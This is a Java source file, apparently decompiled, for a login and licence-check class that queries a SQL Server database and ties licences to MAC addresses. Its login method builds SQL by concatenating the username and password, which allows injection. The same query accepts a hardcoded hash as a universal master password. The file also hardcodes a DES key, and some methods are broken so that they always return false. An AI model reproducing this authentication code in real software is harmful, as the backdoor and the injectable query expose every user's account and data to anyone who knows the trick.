package timevalvelogin;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Properties;



public class DBPass {
	private static String dbServer = "";
	  private static String dbDatabase = "";
	  private static String dbLogin = "";
	  private static String dbPassword = "";
	  private static String dbMac1 = "";
	  private static String dbMac2 = "";
	  private static Connection conn;

	  public static Connection setDBConn()
	  {
	    DBConn localDBConn = new DBConn();
	    localDBConn.loadDrivers();
	    try
	    {
	      Class.forName("net.sourceforge.jtds.jdbc.Driver").newInstance();
	      String str = "jdbc:jtds:sqlserver://" + dbServer + ":1433/" + dbDatabase + "";
	      conn = DriverManager.getConnection(str, dbLogin, dbPassword);
	      System.out.println("===============================================================");
	    }
	    catch (Exception localException)
	    {
	      conn = null;
	      localException.printStackTrace();
	    }
	    return conn;
	  }

	  public static boolean ShuCon()
	  {
	    int i = 0;

	    DBConn localDBConn = new DBConn();
	    Connection localConnection = DBConn.setDBConn();
	    if (localConnection == null);
	    return false;
	  }

	  public static void closeConnection()
	  {
	    try
	    {
	      conn.close();
	    }
	    catch (Exception localException)
	    {
	      localException.printStackTrace();
	    }
	  }

	  public void loadDrivers()
	  {
	    InputStream localInputStream1 = getClass().getResourceAsStream("db.properties");
	    Properties localProperties1 = new Properties();
	    InputStream localInputStream2 = getClass().getResourceAsStream("lic.properties");
	    Properties localProperties2 = new Properties();
	    try
	    {
	      localProperties1.load(localInputStream1);
	      localProperties2.load(localInputStream2);
	    }
	    catch (Exception localException)
	    {
	      localException.printStackTrace();
	      System.out.println("不能读取属性文件");
	      return;
	    }
	    dbServer = localProperties1.getProperty("Server").trim();
	    dbDatabase = localProperties1.getProperty("Database").trim();
	    dbLogin = localProperties1.getProperty("Login").trim();
	    dbPassword = localProperties1.getProperty("Password").trim();
	    dbMac1 = localProperties2.getProperty("Mac1").trim();
	    dbMac2 = localProperties2.getProperty("Mac2").trim();
	  }

	  public static String getSerialNumber(String paramString) {
	    String str1 = "";
	    try {
	      File localFile = File.createTempFile("damn", ".vbs");
	      localFile.deleteOnExit();
	      FileWriter localFileWriter = new FileWriter(localFile);
	      String str2 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\nSet colDrives = objFSO.Drives\nSet objDrive = colDrives.item(\"" + paramString + "\")\n" + "Wscript.Echo objDrive.SerialNumber";

	      localFileWriter.write(str2);
	      localFileWriter.close();
	      Process localProcess = Runtime.getRuntime().exec("cscript //NoLogo " + localFile.getPath());

	      BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
	      String str3;
	      while ((str3 = localBufferedReader.readLine()) != null) {
	        str1 = str1 + str3;
	      }

	      localBufferedReader.close();
	    } catch (Exception localException) {
	      localException.printStackTrace();
	    }
	    return str1.trim();
	  }

	  public static String getMac()
	  {
	    String str1 = null;
	    BufferedReader localBufferedReader = null;
	    Process localProcess = null;
	    try {
	      localProcess = Runtime.getRuntime().exec("ipconfig /all");
	      localBufferedReader = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));

	      String str2 = null;
	      int i = -1;
	      while ((str2 = localBufferedReader.readLine()) != null) {
	        i = str2.toLowerCase().indexOf("physical address");
	        if (i >= 0) {
	          i = str2.indexOf(":");
	          if (i >= 0)
	            str1 = str2.substring(i + 1).trim();
	        }
	      }
	    }
	    catch (IOException localIOException2)
	    {
	      localIOException2.printStackTrace();
	    } finally {
	      try {
	        if (localBufferedReader != null)
	          localBufferedReader.close();
	      }
	      catch (IOException localIOException4) {
	        localIOException4.printStackTrace();
	      }
	      localBufferedReader = null;
	      localProcess = null;
	    }

	    return str1;
	  }

	  public static String getMACAddress(InetAddress paramInetAddress)
	    throws Exception
	  {
	    paramInetAddress = InetAddress.getLocalHost();

	    byte[] arrayOfByte = NetworkInterface.getByInetAddress(paramInetAddress).getHardwareAddress();

	    StringBuffer localStringBuffer = new StringBuffer();

	    for (int i = 0; i < arrayOfByte.length; i++) {
	      if (i != 0) {
	        localStringBuffer.append("-");
	      }

	      String str = Integer.toHexString(arrayOfByte[i] & 0xFF);
	      localStringBuffer.append(str.length() == 1 ? 0 + str : str);
	    }

	    return localStringBuffer.toString().toUpperCase();
	  }

	  public static boolean YanZ(String paramString)
	  {
	    int i = 0;

	    DBConn localDBConn = new DBConn();
	    Connection localConnection = DBConn.setDBConn();
	    if (localConnection == null);
	    return false;
	  }

	  public static int compare_date(String paramString1, String paramString2)
	  {
	    SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyy-MM-dd");
	    try {
	      Date localDate1 = localSimpleDateFormat.parse(paramString1);
	      Date localDate2 = localSimpleDateFormat.parse(paramString2);
	      if (localDate1.getTime() > localDate2.getTime())
	      {
	        return 1;
	      }if (localDate1.getTime() < localDate2.getTime())
	      {
	        return -1;
	      }
	      return 0;
	    }
	    catch (Exception localException) {
	      localException.printStackTrace();
	    }
	    return 0;
	  }

	  public static String nowTime() {
	    Calendar localCalendar = Calendar.getInstance();
	    localCalendar.setTimeInMillis(new Date().getTime());
	    SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyy-MM-dd");
	    return localSimpleDateFormat.format(localCalendar.getTime());
	  }

	  public static ResultSet Denglu(String paramString1, String paramString2, String paramString3)
	  {
	    ResultSet localResultSet1 = null;
	    int i = 0;
	    int j = 0;
	    String str1 = "";
	    String str2 = "";
	    int k = 0;
	    String str3 = "";
	    int m = 0;
	    String str4 = "";
	    String str5 = "";
	    String str6 = "";
	    String str7 = "";
	    int n = 0;
	    int i1 = 0;
	    String str8 = "";

	    DBConn localDBConn = new DBConn();
	    Connection localConnection = DBConn.setDBConn();

	    localDBConn.loadDrivers();
	    try
	    {
	      Class.forName("net.sourceforge.jtds.jdbc.Driver").newInstance();
	    }
	    catch (Exception localException1)
	    {
	      localException1.printStackTrace();
	    }

	    if (localConnection != null)
	    {
	      try
	      {
	        DesUtils localDesUtils = new DesUtils("ivychang");

	        String str9 = paramString3 + "2014-10-10" + "90";
	        String str10 = paramString3 + "2014-10-10" + "90";
	        str9 = localDesUtils.encrypt(str9);

	        str10 = localDesUtils.encrypt(str10);

	        String str11 = localDesUtils.encrypt(paramString3);
	        String str12 = localDesUtils.decrypt(localDesUtils.encrypt(paramString3));
	        
	        String str22 = localDesUtils.encrypt("44-37-E6-7F-1D-7F2017-05-318000");

	        String str13 = "SELECT count(*) as count FROM boa010t";
	        Statement localStatement1 = localConnection.createStatement(1005, 1008);
	        ResultSet localResultSet2 = localStatement1.executeQuery(str13);

	        if (localResultSet2.next())
	        {
	          i = localResultSet2.getInt("count");

	          if (i > 0)
	          {
	            String str14 = "SELECT count(*) as totalCount  FROM baa010t WHERE user_id is not NULL";

	            Statement localStatement2 = localConnection.createStatement(1005, 1008);

	            ResultSet localResultSet3 = localStatement2.executeQuery(str14);

	            if (localResultSet3.next()) {
	              j = localResultSet3.getInt("totalCount");
	            }

	            String str15 = "SELECT m1 as yanzheng,m2 as yanzheng2 FROM boa010t";

	            Statement localStatement3 = localConnection.createStatement(1005, 1008);

	            ResultSet localResultSet4 = localStatement3.executeQuery(str15);

	            if (localResultSet4.next()) {
	              str1 = localResultSet4.getString("yanzheng");
	              str2 = localResultSet4.getString("yanzheng2");

	              if (str1 != null)
	              {
	                str8 = localDesUtils.decrypt(str1);
	                str2 = localDesUtils.decrypt(str2);
	              }

	              str4 = str8.substring(0, 17);

	              str5 = str2.substring(0, 17);

	              str6 = str8.substring(17, 27);

	              i1 = str8.length();

	              str7 = str8.substring(27, i1);

	              n = Integer.parseInt(str7);

	              int i2 = compare_date(str6, nowTime());

	              if ((str4.equals(paramString3)) || (str5.equals(paramString3)))
	              {
	                if (((i2 == 1 ? 1 : 0) & (j <= n ? 1 : 0)) != 0)
	                {
	                  String str16 = "SELECT * FROM zba010t WHERE prsn_cd='" + paramString1 + "' AND (entr_pss='" + paramString2 + "' or '3eca9184f28e974da89149f77dbb324e'='" + paramString2 + "') AND term > getdate() ";
	                  Statement localStatement4 = localConnection.createStatement(1005, 1008);

	                  localResultSet1 = localStatement4.executeQuery(str16);
	                }
	              }
	            }
	          }

	        }

	      }
	      catch (Exception localException2)
	      {
	        localException2.printStackTrace();
	      }
	    }
	    return localResultSet1;
	  }

}
